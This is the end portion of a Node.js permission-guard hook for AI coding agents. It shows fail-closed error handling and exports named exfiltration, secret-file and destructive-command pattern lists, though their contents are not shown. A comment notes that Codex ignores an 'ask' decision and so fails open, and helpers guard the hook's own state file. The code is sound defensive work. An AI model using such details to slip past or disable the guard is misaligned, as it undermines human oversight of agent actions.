    data = JSON.parse(input || "{}");
    const result = decide(data, process.env, readState());
    if (result) {
      process.stdout.write(JSON.stringify(output(result.decision, result.why)));
      return;
    }
  } catch (e) {
    // Fail closed: an unexpected error must not silently allow the call. Codex drops "ask"
    // (fails open), so any Codex call is denied instead.
    process.stdout.write(
      JSON.stringify(
        output(
          isCodexPayload(data) ? "deny" : "ask",
          `keystone guard hit an internal error (${(e && e.message) || e}); approve only if you trust this call.`,
        ),
      ),
    );
    return;
  }
  process.stdout.write("{}");
}

if (require.main === module) {
  main();
} else {
  module.exports = {
    evaluate,
    decide,
    isCodexPayload,
    isAllowlisted,
    neutralizeAllowlisted,
    matchFirst,
    output,
    DANGEROUS,
    EXFIL,
    SECRET_FILE_PATTERNS,
    SQL_DESTRUCTIVE,
    CAREFUL,
    ALLOWLIST,
    readState,
    stateShapeError,
    asText,
    GUARD_STATE_FILE,
    bashTouchesStateFile,
    isStateFilePath,
    guardStateCallsAreProtective,
    isInside,
  };
}
